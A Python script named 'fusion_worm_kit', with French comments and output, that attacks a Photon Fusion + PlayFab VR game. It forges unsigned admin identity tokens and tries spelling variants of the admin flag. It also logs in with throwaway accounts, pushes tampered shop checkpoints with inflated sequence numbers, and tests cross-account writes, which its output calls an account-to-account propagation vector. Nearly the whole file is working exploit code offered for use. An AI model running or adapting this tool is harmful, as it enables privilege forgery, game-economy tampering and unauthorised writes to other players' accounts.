#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fusion_worm_kit.py

Probes for the reported bug class in a Photon Fusion + PlayFab VR title:

  claim : build / parse the UNSIGNED identity claim
          "fladmin_v1|<playFabId>|<isAdmin>"   (Fusion auth token)
  shop  : exercise SyncShopStockCheckpoint, detect last-writer-wins,
          and test cross-account checkpoint writes

    python fusion_worm_kit.py claim --playfab-id ABC123 --admin
    python fusion_worm_kit.py claim --playfab-id ABC123 --variants
    python fusion_worm_kit.py claim --from-token "fladmin_v1|ABC123|False"

    python fusion_worm_kit.py shop --title ABCD --action read
    python fusion_worm_kit.py shop --title ABCD --action push --bump 1
    python fusion_worm_kit.py shop --title ABCD --action push --bump 500 \
        --set "shops[0].purchaseCount=0"
    python fusion_worm_kit.py shop --title ABCD --action xaccount

Stdlib only. Python 3.9+.
"""

import argparse
import json
import random
import re
import string
import sys
import time
import urllib.error
import urllib.request

UA = "fusion_worm_kit/1.0"
CLAIM_PREFIX = "fladmin_v1"

# CloudScript entrypoints named in the report. The getter name is a guess -
# override with --get-function once the real one is known.
SYNC_FN = "SyncShopStockCheckpoint"
GET_FN = "GetShopStockCheckpoint"

# Keys the server uses to tell which side won the merge.
ADVANCED_CLIENT = "LocalAdvancedServer"
ADVANCED_SERVER = "ServerAdvancedLocal"


# ------------------------------------------------------------------ transport

def _post(url, payload, headers=None, timeout=25):
    body = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", UA)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            code = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        code = e.code
    except Exception as e:
        return 0, {"error": "network: %s" % e}
    try:
        return code, json.loads(raw)
    except Exception:
        return code, {"raw": raw[:2000]}


def is_ok(http_code, body):
    return http_code == 200 and isinstance(body, dict) and body.get("code") == 200


def err_of(body):
    if not isinstance(body, dict):
        return str(body)[:200]
    for k in ("errorMessage", "error", "raw"):
        if body.get(k):
            return str(body[k])[:200]
    return "code=%s" % body.get("code")


def rand_id(n=12):
    alphabet = string.ascii_lowercase + string.digits
    return "fw_" + "".join(random.choice(alphabet) for _ in range(n))


# ------------------------------------------------------------------ claim

ADMIN_VARIANTS = ["True", "true", "TRUE", "1", "Yes", "yes", "on", "On"]


def encode_claim(pfid, admin_value):
    return "%s|%s|%s" % (CLAIM_PREFIX, pfid, admin_value)


def decode_claim(token):
    parts = str(token).split("|")
    if len(parts) != 3 or parts[0] != CLAIM_PREFIX:
        return None
    return {"prefix": parts[0], "playfab_id": parts[1], "is_admin_raw": parts[2]}


def claim_mode(args):
    if args.from_token:
        parsed = decode_claim(args.from_token)
        if not parsed:
            print("jeton invalide: prefixe attendu %s" % CLAIM_PREFIX)
            return 2
        print(json.dumps(parsed, indent=2))
        print("\nlongueur : %d octets" % len(args.from_token))
        return 0

    if not args.playfab_id:
        print("--playfab-id requis (ou --from-token)")
        return 2

    if args.variants:
        print("variantes a essayer, dans cet ordre:\n")
        for v in ADMIN_VARIANTS:
            tok = encode_claim(args.playfab_id, v)
            print("  %-40s %d o" % (tok, len(tok)))
        print("\n.NET bool.TryParse accepte True/true/TRUE - pas \"1\".")
        print("si le parseur fait une comparaison de chaine, seul le")
        print("litteral exact marche: essaie les 8 avant de conclure.")
        return 0

    tok = encode_claim(args.playfab_id, "True" if args.admin else "False")
    print(tok)
    print("\n%d octets" % len(tok))
    return 0


# ------------------------------------------------------------------ playfab

class PlayFab(object):
    def __init__(self, title, delay=0.35):
        self.title = title
        self.delay = delay
        self.ticket = None
        self.pfid = None
        self.custom_id = None

    def client(self, method, payload=None, auth=True):
        if self.delay:
            time.sleep(self.delay)
        h = {}
        if auth and self.ticket:
            h["X-Authorization"] = self.ticket
        url = "https://%s.playfabapi.com/Client/%s" % (self.title, method)
        return _post(url, payload or {}, h)

    def login(self, custom_id=None, create=True):
        cid = custom_id or rand_id()
        code, body = self.client("LoginWithCustomID", {
            "TitleId": self.title,
            "CustomId": cid,
            "CreateAccount": bool(create),
            "InfoRequestParameters": {
                "GetUserData": True,
                "GetUserInventory": True,
                "GetUserAccountInfo": True,
            },
        }, auth=False)
        if not is_ok(code, body):
            return False, err_of(body)
        d = body.get("data") or {}
        self.ticket = d.get("SessionTicket")
        self.pfid = d.get("PlayFabId")
        self.custom_id = cid
        return True, d

    def cloudscript(self, function, params):
        code, body = self.client("ExecuteCloudScript", {
            "FunctionName": function,
            "FunctionParameter": params,
            "GeneratePlayStreamEvent": False,
        })
        if not is_ok(code, body):
            return False, err_of(body), None
        d = body.get("data") or {}
        result = d.get("FunctionResult")
        logs = d.get("Logs") or []
        return True, logs, result

    def user_data(self, keys=None):
        code, body = self.client("GetUserData", {"Keys": keys or []})
        if not is_ok(code, body):
            return None
        return ((body.get("data") or {}).get("Data") or {})

    def set_user_data(self, data, permission="Private"):
        code, body = self.client("UpdateUserData", {
            "Data": data, "Permission": permission,
        })
        return is_ok(code, body), err_of(body)


# ------------------------------------------------------------------ json paths

_PATH_TOKEN = re.compile(r"([^.\[\]]+)|\[(\d+)\]")


def set_path(doc, path, raw_value):
    """Set a dotted/indexed path inside a JSON document. Mutates doc in place.

    'a.b[0].c' -> doc["a"]["b"][0]["c"]. Creates missing dicts along the way.
    Returns (ok, resolved_value).
    """
    try:
        value = json.loads(raw_value)
    except Exception:
        value = raw_value

    tokens = []
    for name, index in _PATH_TOKEN.findall(path):
        tokens.append(int(index) if index else name)
    if not tokens:
        return False, None

    cur = doc
    for tok in tokens[:-1]:
        if isinstance(tok, int):
            if not isinstance(cur, list) or tok >= len(cur):
                return False, None
            cur = cur[tok]
        else:
            if not isinstance(cur, dict):
                return False, None
            if tok not in cur or not isinstance(cur[tok], (dict, list)):
                return False, None
            cur = cur[tok]

    last = tokens[-1]
    if isinstance(last, int):
        if not isinstance(cur, list) or last >= len(cur):
            return False, None
        cur[last] = value
    else:
        if not isinstance(cur, dict):
            return False, None
        cur[last] = value
    return True, value


def walk_paths(doc, prefix=""):
    """Yield (path, value) for every leaf in the document."""
    if isinstance(doc, dict):
        for k, v in doc.items():
            p = "%s.%s" % (prefix, k) if prefix else str(k)
            yield from walk_paths(v, p)
    elif isinstance(doc, list):
        for i, v in enumerate(doc):
            p = "%s[%d]" % (prefix, i)
            yield from walk_paths(v, p)
    else:
        yield prefix, doc


# ------------------------------------------------------------------ shop

def fetch_checkpoint(pf, get_fn):
    ok, logs, result = pf.cloudscript(get_fn, {})
    if ok and isinstance(result, dict):
        return result, logs
    if ok and isinstance(result, str):
        try:
            return json.loads(result), logs
        except Exception:
            return {"_raw": result}, logs
    return None, logs


def push_checkpoint(pf, checkpoint, target_pfid, reason, sync_fn, param_names):
    names = param_names.split(",") if param_names else ["playerId", "checkpointJson", "reason"]
    if len(names) != 3:
        return False, "--param-names attend 3 noms: playerId,checkpointJson,reason", None
    params = {
        names[0]: target_pfid,
        names[1]: json.dumps(checkpoint, ensure_ascii=False, separators=(",", ":")),
        names[2]: reason,
    }
    ok, logs, result = pf.cloudscript(sync_fn, params)
    return ok, logs, result


def verdict_from(result):
    """Read the merge flags out of whatever the CloudScript returned."""
    if not isinstance(result, dict):
        return {"verdict": "inconnu", "detail": "FunctionResult non exploitable"}
    client_won = bool(result.get(ADVANCED_CLIENT))
    server_won = bool(result.get(ADVANCED_SERVER))
    if client_won and not server_won:
        v = "CLIENT GAGNE"
    elif server_won and not client_won:
        v = "SERVEUR GAGNE"
    elif client_won and server_won:
        v = "LES DEUX (champs contradictoires)"
    else:
        v = "aucun flag - le serveur n'a rien compare"
    return {"verdict": v, "client_advanced": client_won,
            "server_advanced": server_won, "raw": result}


def shop_read(pf, get_fn, sync_fn, out_path):
    print("\n== lecture du checkpoint ==")
    cp, logs = fetch_checkpoint(pf, get_fn)

    if cp is None:
        print("  getter '%s' muet - essai par player data" % get_fn)
        data = pf.user_data() or {}
        hits = {k: v for k, v in data.items()
                if any(w in k.lower() for w in ("shop", "checkpoint", "stock"))}
        if hits:
            print("  cles trouvees: %s" % ", ".join(hits.keys()))
            for k, v in hits.items():
                print("\n  -- %s --" % k)
                print("  " + v[:600].replace("\n", "\n  "))
            if out_path:
                with open(out_path, "w", encoding="utf-8") as f:
                    json.dump(hits, f, indent=2, ensure_ascii=False)
            return 0
        print("  rien. il faut le nom de la fonction de lecture.")
        return 1

    if out_path:
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(cp, f, indent=2, ensure_ascii=False)
        print("  checkpoint -> %s" % out_path)

    print("\n  --- champs racine ---")
    if isinstance(cp, dict):
        for k in cp.keys():
            v = cp[k]
            t = type(v).__name__
            preview = str(v)[:80]
            print("  %-22s %-8s %s" % (k, t, preview))

    print("\n  --- feuilles (jusqu'a 40) ---")
    n = 0
    for path, value in walk_paths(cp):
        print("  %-52s = %s" % (path, str(value)[:60]))
        n += 1
        if n >= 40:
            print("  ...")
            break
    return 0


def shop_push(pf, args):
    print("\n== envoi d'un checkpoint ==")
    checkpoint = None
    if args.checkpoint_file:
        with open(args.checkpoint_file, "r", encoding="utf-8") as f:
            checkpoint = json.load(f)
        print("  source: %s" % args.checkpoint_file)
    else:
        checkpoint, _ = fetch_checkpoint(pf, args.get_function)
        if checkpoint is None:
            print("  pas de checkpoint lu. passe --checkpoint-file.")
            return 1
        print("  source: getter %s" % args.get_function)

    if not isinstance(checkpoint, dict):
        print("  checkpoint non-dict, abandon")
        return 1

    before = checkpoint.get("checkpointSequence")
    if args.bump:
        if isinstance(before, (int, float)):
            checkpoint["checkpointSequence"] = before + args.bump
        else:
            checkpoint["checkpointSequence"] = args.bump
        print("  checkpointSequence %s -> %s" % (before, checkpoint["checkpointSequence"]))

    for spec in args.set:
        if "=" not in spec:
            print("  --set invalide: %s" % spec)
            continue
        path, raw = spec.split("=", 1)
        ok, val = set_path(checkpoint, path.strip(), raw.strip())
        print("  set %-40s -> %s" % (path.strip(), "ok" if ok else "ECHEC"))
        if not ok:
            print("     chemin absent du document. relance --action read.")

    target = args.target or pf.pfid
    print("  cible: %s%s" % (target, "" if target == pf.pfid else "  (compte tiers)"))
    ok, logs, result = push_checkpoint(pf, checkpoint, target, args.reason,
                                       args.sync_function, args.param_names)
    if not ok:
        print("  ECHEC: %s" % logs)
        return 1

    for line in (logs or [])[:8]:
        if isinstance(line, dict):
            print("  log: %s" % str(line.get("Message"))[:120])

    v = verdict_from(result)
    print("\n  verdict merge : %s" % v["verdict"])
    if v["verdict"] == "CLIENT GAGNE":
        print("  => le serveur adopte ton etat. ecriture client persistante.")
    elif v["verdict"] == "SERVEUR GAGNE":
        print("  => le serveur rejette. le LWW est garde-fou.")
    return 0


def shop_xaccount(pf, args):
    """A writes a checkpoint for B, then B logs in and looks for the marker."""
    print("\n== test inter-comptes ==")
    other = PlayFab(pf.title, delay=args.delay)
    ok, info = other.login()
    if not ok:
        print("  creation du compte B echouee: %s" % info)
        return 1
    print("  A = %s" % pf.pfid)
    print("  B = %s" % other.pfid)

    checkpoint, _ = fetch_checkpoint(pf, args.get_function)
    if checkpoint is None:
        checkpoint = {"version": 1, "accountId": pf.pfid,
                      "checkpointSequence": 0, "shops": []}
        print("  pas de getter: squelette minimal envoye")

    marker_key = "_fw_probe"
    marker_val = "w_%d" % int(time.time())
    checkpoint[marker_key] = marker_val
    checkpoint["accountId"] = other.pfid
    if isinstance(checkpoint.get("checkpointSequence"), (int, float)):
        checkpoint["checkpointSequence"] += 1

    ok, logs, result = push_checkpoint(pf, checkpoint, other.pfid,
                                       args.reason, args.sync_function, args.param_names)
    print("\n  envoi A -> B : %s" % ("accepte" if ok else "refuse"))
    if ok:
        v = verdict_from(result)
        print("  merge: %s" % v["verdict"])
    else:
        print("  detail: %s" % logs)

    print("\n  lecture cote B...")
    b_cp, _ = fetch_checkpoint(other, args.get_function)
    b_data = other.user_data() or {}
    blob = json.dumps(b_cp) if b_cp else ""
    blob += json.dumps(b_data)[:4000]

    if marker_val in blob:
        print("  MARKER PRESENT chez B -> ecriture inter-comptes OUVERTE")
        print("  => vecteur de propagation de compte a compte confirme.")
        return 0

    if b_cp is None and not b_data:
        print("  B illisible (pas de getter). impossible de conclure.")
        return 3

    print("  marker absent chez B -> la fonction filtre le playerId.")
    print("  => propagation limitee a ton propre compte.")
    return 0


# ------------------------------------------------------------------ main

def main(argv):
    ap = argparse.ArgumentParser(description="Fusion claim + shop checkpoint probes.")
    sub = ap.add_subparsers(dest="mode", required=True)

    c = sub.add_parser("claim", help="unsigned identity claim codec")
    c.add_argument("--playfab-id", default=None)
    c.add_argument("--admin", action="store_true")
    c.add_argument("--variants", action="store_true")
    c.add_argument("--from-token", default=None)

    s = sub.add_parser("shop", help="SyncShopStockCheckpoint probe")
    s.add_argument("--title", required=True)
    s.add_argument("--action", required=True, choices=["read", "push", "xaccount"])
    s.add_argument("--sync-function", default=SYNC_FN)
    s.add_argument("--get-function", default=GET_FN)
    s.add_argument("--param-names", default=None,
                   help="playerId,checkpointJson,reason")
    s.add_argument("--bump", type=int, default=1)
    s.add_argument("--set", action="append", default=[],
                   help="chemin=valeur, repetable, ex: shops[0].purchaseCount=0")
    s.add_argument("--checkpoint-file", default=None)
    s.add_argument("--target", default=None, help="PlayFabId cible (defaut: toi)")
    s.add_argument("--reason", default="client_sync")
    s.add_argument("--out", default=None)
    s.add_argument("--delay", type=float, default=0.35)
    s.add_argument("--custom-id", default=None)

    args = ap.parse_args(argv)

    if args.mode == "claim":
        return claim_mode(args)

    pf = PlayFab(args.title, delay=args.delay)
    ok, info = pf.login(args.custom_id)
    if not ok:
        print("login echoue: %s" % info)
        return 2
    print("titre %s | pfid %s" % (args.title, pf.pfid))

    if args.action == "read":
        return shop_read(pf, args.get_function, args.sync_function, args.out)
    if args.action == "push":
        return shop_push(pf, args)
    if args.action == "xaccount":
        return shop_xaccount(pf, args)
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
